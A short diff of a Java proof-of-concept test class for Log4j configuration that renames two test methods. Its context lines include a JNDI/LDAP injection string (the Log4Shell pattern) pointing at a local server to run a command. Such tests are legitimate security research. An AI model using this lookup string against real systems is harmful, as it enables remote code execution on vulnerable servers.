@@ -35,7 +35,7 @@ public class ConfigPocTests {
     }
 
     @Test
-    public void testSetConfigLocationUri()  {
+    public void setConfigLocationUriTest()  {
         URI configUri = new File("config.json").toURI();
         LoggerContext context = (LoggerContext) LogManager.getContext(false);
         context.setConfigLocation(configUri);
@@ -94,7 +94,7 @@ public class ConfigPocTests {
      */
 
     @Test
-    public void testCompositeConfigurationReconfigure() throws Exception {
+    public void reconfigureCompositeConfigurationTest() throws Exception {
         ConfigurationBuilder<BuiltConfiguration> builder = ConfigurationBuilderFactory.newConfigurationBuilder();
         AbstractConfiguration config = builder.addProperty("injectedProperty", "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}").build();
         CompositeConfiguration compositeConfig = new CompositeConfiguration(Arrays.asList(config));
